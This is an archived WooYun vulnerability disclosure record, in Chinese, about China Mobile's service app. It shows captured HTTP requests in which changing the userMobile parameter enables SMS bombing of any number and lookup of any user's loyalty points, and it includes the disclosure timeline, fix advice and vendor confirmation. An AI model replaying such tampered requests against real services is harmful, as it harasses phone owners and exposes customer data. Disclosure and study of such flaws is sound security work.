{"id": 54678, "wybug_id": "wooyun-2014-063712", "wybug_title": "中移动APP导致短信轰炸和任意用户积分查询", "wybug_corp": "中国移动", "wybug_author": "sxx", "wybug_date": "2014-06-06 11:56", "wybug_open_date": "2014-07-23 21:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： 中移动APP导致短信轰炸和任意用户积分查询 详细说明：  手机营业厅最新版APP存在短信轰炸和任意用户积分查询安全问题，APP下载地址如下：http://clientdispatch.10086.cn:8080/downfile/apk/CM10086_android_V1.9.0_0515.apk通过对中国移动手机营业厅的APP简单抓包分析，如下：   漏洞证明：  短信轰炸，以下问题重现需要登录并获取token后再进行操作，在使用积分兑换礼物时，有个短信校验的功能，通过对提交的数据抓包分析，发现可修改参数“13800138000”为任意手机号码，并进行短信轰炸。POST /mPhoneServer/httpReceiver HTTP/1.1JSESSIONID: JSESSIONID=C758B4E62FFCB662964182CA1C294AA7Content-Length: 335Content-Type: application/x-www-form-urlencodedHost: jf.10086.cnConnection: Keep-AliveUser-Agent: Mozilla/5.0(Linux;U;Android 2.2.1;en-us;Nexus One Build.FRG83) AppleWebKit/553.1(KHTML,like Gecko) Version/4.0 Mobile Safari/533.1Expect: 100-continueCookie: JSESSIONID=C758B4E62FFCB662964182CA1C294AA7Cookie2: $Version=1paramdata=%7B%22mobileModel%22%3A%22iphone%22%2C%22wareBrand%22%3A%220%22%2C%22busicode%22%3A%22fsdxqrm%22%2C%22pattern%22%3A%22android%22%2C%22token%22%3A%22JSESSIONID%3D00001jPOAEOzzOmFMZ0l3w0dEE0%3A-1%3BTicketID%3D45%22%2C%22userMobile%22%3A%2213800138000%22%2C%22mobileProvince%22%3A%22sh%22%2C%22version%22%3A%222.1.1%22%7DHTTP/1.1 100 ContinueVia: 1.1 ID-0002262030454512 uproxy-2HTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/plain;charset=UTF-8Date: Wed, 04 Jun 2014 08:52:00 GMTConnection: Keep-aliveKeep-Alive: timeout=15, max=100Via: 1.1 ID-0002262030454512 uproxy-2Content-Length: 102{\"isSuccess\":\"1\",\"retCode\":\"0000\",\"retInfo\":{\"confirmCode\":\"****\"},\"isLogin\":\"ok\",\"isHasUserInfo\":\"0\"}\n\n任意用户积分查询，以下问题重现需要登录并获取token后再进行操作，在登录移动APP后，对请求的数据进行截取，如下：POST /mPhoneServer/httpReceiver HTTP/1.1Content-Length: 272Content-Type: application/x-www-form-urlencodedHost: jf.10086.cnConnection: Keep-AliveUser-Agent: Mozilla/5.0(Linux;U;Android 2.2.1;en-us;Nexus One Build.FRG83) AppleWebKit/553.1(KHTML,like Gecko) Version/4.0 Mobile Safari/533.1Expect: 100-continueparamdata=%7B%22mobileModel%22%3A%22iphone%22%2C%22userMobile%22%3A%2213800138000%22%2C%22busicode%22%3A%22hqyhxx%22%2C%22pattern%22%3A%22android%22%2C%22token%22%3A%22JSESSIONID%3D00001jPOAEOzzOmFMZ0l3w0dEE0%3A-1%3BTicketID%3D45%22%2C%22version%22%3A%222.1.1%22%7D返回数据：HTTP/1.1 100 ContinueVia: 1.1 ID-0002262030454512 uproxy-7HTTP/1.1 200 OKServer: Apache-Coyote/1.1Set-Cookie: JSESSIONID=C758B4E62FFCB662964182CA1C294AA7; Path=/mPhoneServer; SecureContent-Type: text/plain;charset=UTF-8Date: Wed, 04 Jun 2014 08:34:37 GMTConnection: Keep-aliveKeep-Alive: timeout=15, max=100Via: 1.1 ID-0002262030454512 uproxy-7Content-Length: 201{\"isSuccess\":\"1\",\"retCode\":\"0000\",\"retInfo\":{\"userMobile\":\"13800138000\",\"wareBrand\":\"0\",\"userLevel\":\"100\",\"userStatus\":\"00\",\"mobileProvince\":\"zj\",\"userScore\":\"9799\"},\"isLogin\":\"ok\",\"isHasUserInfo\":\"0\"}其中userScore值为当前用户积分数量，修改请求的手机号码，即可查看任意用户积分信息   修复方案：  增加权限验证   版权声明：转载请注明来源 sxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-11 10:50 厂商回复： CNVD确认所述情况，已经转报给中国移动集团公司处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}